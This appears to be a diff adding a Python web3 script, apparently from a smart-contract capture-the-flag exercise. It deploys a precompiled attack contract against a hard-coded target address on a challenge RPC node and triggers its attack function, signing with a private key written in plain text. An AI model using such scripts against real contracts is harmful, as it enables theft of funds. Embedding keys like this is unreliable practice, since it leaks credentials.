@@ -1,0 +1,52 @@
+```py
+from web3 import Web3
+import json
+from solc import compile_source
+import time
+w3 = Web3(Web3.HTTPProvider("http://3.38.115.85:8545/3e79b353-313a-49b7-b4ec-1e9336570ccc"))
+
+prikey = '0x280b42814d9ede651f3f63a812fae8a3a9c4b4831389724296475cb78684d581'
+
+PA=w3.eth.account.from_key(prikey)
+Public_Address=PA.address
+
+def attack():
+    f = open("att.abi", "r"); contract_abi= f.read(); f.close()
+    f = open("att.bin", "r"); contract_bytecode= f.read(); f.close()
+
+    contract = w3.eth.contract(abi=contract_abi, bytecode=contract_bytecode)
+    transaction = contract.constructor("0xce4AB0D41A53CD0De12b956D59D9bcfC8582467c").build_transaction(
+        {
+            "chainId": w3.eth.chain_id,
+            "gasPrice": w3.eth.gas_price,
+            "from": Public_Address,
+            "nonce": w3.eth.get_transaction_count(Public_Address),
+            "value": 0
+        }
+    )
+    sign_transaction = w3.eth.account.sign_transaction(transaction, private_key=prikey)
+    print("Deploying Contract!")
+    # Send the transaction
+    transaction_hash = w3.eth.send_raw_transaction(sign_transaction.rawTransaction)
+    
+    print("Waiting for transaction to finish...")
+    transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
+    print(transaction_receipt)
+    print(f"Done! Contract deployed to {transaction_receipt.contractAddress}")
+    addr =  str(transaction_receipt.contractAddress)   
+
+    contract = w3.eth.contract(address=addr, abi=contract_abi)
+    func_call = contract.functions["attack"]().build_transaction({
+        "from": Public_Address,
+        "nonce": w3.eth.get_transaction_count(Public_Address),
+        "gasPrice": w3.eth.gas_price,
+        "chainId": w3.eth.chain_id,
+    })
+    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)
+    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
+    print(transaction_receipt)
+
+attack()
+```
+대깨파입니다
